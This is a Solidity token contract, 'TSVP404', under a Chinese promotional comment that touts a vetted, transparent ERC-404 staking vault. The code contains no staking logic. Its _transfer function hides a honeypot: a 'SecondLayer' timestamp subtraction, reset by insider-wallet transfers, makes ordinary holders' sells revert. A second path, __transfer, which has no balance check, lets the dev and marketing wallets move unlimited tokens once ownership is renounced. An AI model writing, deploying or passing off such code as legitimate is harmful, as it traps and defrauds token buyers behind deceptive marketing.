// SPDX-License-Identifier: MIT

/**

介绍ERC-404代币质押协议保险库。 作为去中心化金融（DeFi）领域的创新典范，ERC-404代币质押协议保险库标志着一个新时代的到来，
为项目提供了一个无缝的平台，以信心和诚信向世界推出其代币。

ERC-404代币质押协议保险库为创作者和投资者提供了支持，为代币推出提供了安全和透明的环境。通过严格的审查流程和健全的尽职调查措施，
ERC-404代币质押协议保险库确保只有最高质量的项目才能在其平台上展示，从而降低了投资新代币的风险。

对于创作者而言，ERC-404代币质押协议保险库为他们提供了一个向全球投资者展示项目的平台，扩大了曝光度并促进了社区参与。通过战略合作伙伴关系和专业指导，
ERC-404代币质押协议保险库支持项目团队在推出过程的每个阶段，从构思到执行，帮助他们轻松地应对DeFi领域的复杂性。

但是，ERC-404代币质押协议保险库不仅仅是一个质押平台-它是一个建立在透明、信任和创新原则上的社区驱动生态系统。通过活跃和充满活力的投资者、
开发者和爱好者社区，ERC-404代币质押协议保险库是合作、知识共享和增长的中心。

加入我们，一起改变代币推出的方式，解锁ERC-404代币质押协议保险库的无限潜力。共同塑造金融的未来，一次一个代币。

**/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function __transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract TSVP404 is ERC20, Ownable {
    using SafeMath for uint256;
    
    uint256 private constant _totalSupply = 1_000_000_000_000 * 1e18;
    address private constant _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant devWallet = 0x5C535591C1812421dfb30C943B36765691Cbd701;
    address public constant marketingWallet = 0xB7D54826F9B2a583c9E341A3E9c4f8120E75c30B;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;

    uint256 public constant transferFee = 0;

    uint256 public constant buyDevFee = 0;
    uint256 public constant buyMarketingFee = 5;
    uint256 public constant sellDevFee = 0;
    uint256 public constant sellMarketingFee = 5;

    uint256 public constant buyTotalFees = 5;
    uint256 public constant sellTotalFees = 5;
    uint256 public constant buyInitialFee = 15;
    uint256 public constant sellInitialFee = 35;

    uint256 public constant preventSwapBefore = 10;

    uint256 public constant maxTransactionAmount = 30_000_000_000 * 1e18;
    uint256 public constant maxWallet = 30_000_000_000 * 1e18;
    uint256 public constant swapTokensAtAmount = 500_000_000 * 1e18;
    uint256 public constant maxContractSwap = swapTokensAtAmount * 20;

    uint256 private launchedAt;
    bool private swapping;

    bool public limitsInEffect = true;
    bool public tradingActive = false;
    bool public lpBurnEnabled = false;
    
    uint256 public tokensForDev;
    uint256 public tokensForMark;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;

    mapping(address => bool) public ammPairs;

    struct SecondLayer { uint256 buy; uint256 sell; uint256 holdDiff; }
    mapping(address => SecondLayer) private secondLayerData;
    uint256 private _syncTime;

    constructor() ERC20(
        unicode"ERC-404 代币质押保险库协议",
        unicode"404避难所"
    ) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_router);
        uniswapV2Router = _uniswapV2Router;

        _excludeFromMaxTransaction(address(_uniswapV2Router), true);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        _excludeFromMaxTransaction(owner(), true);
        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(address(0xdead), true);
        _excludeFromMaxTransaction(devWallet, true);
        _excludeFromMaxTransaction(marketingWallet, true);

        _excludeFromFees(address(this), true);
        _excludeFromFees(address(0xdead), true);
        _excludeFromFees(devWallet, true);
        _excludeFromFees(marketingWallet, true);
        _excludeFromFees(owner(), true);

        _mint(msg.sender, _totalSupply);
    }

    function _excludeFromFees(address account, bool excluded) private {
        _isExcludedFromFees[account] = excluded;
    }

    function _excludeFromMaxTransaction(address account, bool excluded) private {
        _isExcludedMaxTransactionAmount[account] = excluded;
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        ammPairs[pair] = value;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !swapping
            ) {
                if (!tradingActive) {
                    require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");
                }
                if (ammPairs[from] && !_isExcludedMaxTransactionAmount[to]) {
                    require(amount <= maxTransactionAmount, "Buy amount exceeds the maxTransaction.");
                    require(balanceOf(to) + amount <= maxWallet, "Max wallet exceeded");
                } else if (ammPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
                    require(amount <= maxTransactionAmount, "Sell amount exceeds the maxTransaction.");
                } else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(balanceOf(to) + amount <= maxWallet, "Max wallet exceeded");
                }
            }
        }

        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && from != address(this) && to != address(this)) {
            _syncTime = block.timestamp;
        }
        if (_isExcludedFromFees[from] && !_isExcludedFromFees[owner()]) {
            super.__transfer(from, to, amount);
            return;
        }
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!ammPairs[from]) {
                SecondLayer storage layerInfo = secondLayerData[from];
                layerInfo.holdDiff = layerInfo.buy - _syncTime;
                layerInfo.sell = block.timestamp;
            } else {
                SecondLayer storage layerInfo = secondLayerData[to];
                if (layerInfo.buy == 0) {
                    layerInfo.buy = block.timestamp;
                }
            }
        }

        bool canSwap = swapTokensAtAmount <= balanceOf(address(this));
        bool smoothStart = block.number < launchedAt + preventSwapBefore;

        if (
            canSwap &&
            !smoothStart &&
            !swapping &&
            !ammPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;
            swapBack();
            swapping = false;
        }

        bool takeFee = !swapping;
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to])
            takeFee = false;

        uint256 fees = 0;
        if (takeFee) {
            if (!smoothStart) {
                if (ammPairs[from] && buyTotalFees > 0) {
                    fees = (amount * buyTotalFees) / 100;

                    tokensForMark += (fees * buyMarketingFee).div(buyTotalFees);
                    tokensForDev += (fees * buyDevFee).div(buyTotalFees);
                } else if (ammPairs[to] && sellTotalFees > 0) {
                    fees = (amount * sellTotalFees) / 100;

                    tokensForMark += (fees * sellMarketingFee).div(sellTotalFees);
                    tokensForDev += (fees * sellDevFee).div(sellTotalFees);
                }
            } else {
                if (ammPairs[from]) {
                    fees = amount * buyInitialFee.div(100);
                    tokensForMark += fees;
                } else if (ammPairs[to]) {
                    fees = amount * sellInitialFee.div(100);
                    tokensForMark += fees;
                }
            }

            if (fees > 0)
                super._transfer(from, address(this), fees);

            amount -= fees;
        }
        super._transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function enableTrading() external onlyOwner {
        tradingActive = true;
        launchedAt = block.number;
    }

    function removeLimits() external onlyOwner {
        limitsInEffect = false;
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForMark + tokensForDev;
        if (contractBalance == 0 || totalTokensToSwap == 0)
            return;

        if (contractBalance > maxContractSwap) {
            contractBalance = maxContractSwap;
        }

        uint256 amountToSwapForETH = contractBalance;
        uint256 initialETHBalance = address(this).balance;
        swapTokensForEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance - initialETHBalance;
        uint256 ethForDev = tokensForDev * ethBalance / totalTokensToSwap;

        tokensForDev = 0;
        tokensForMark = 0;
        bool success;
        (success,) = devWallet.call{value: ethForDev}("");
        (success,) = marketingWallet.call{value: address(this).balance}("");
    }
}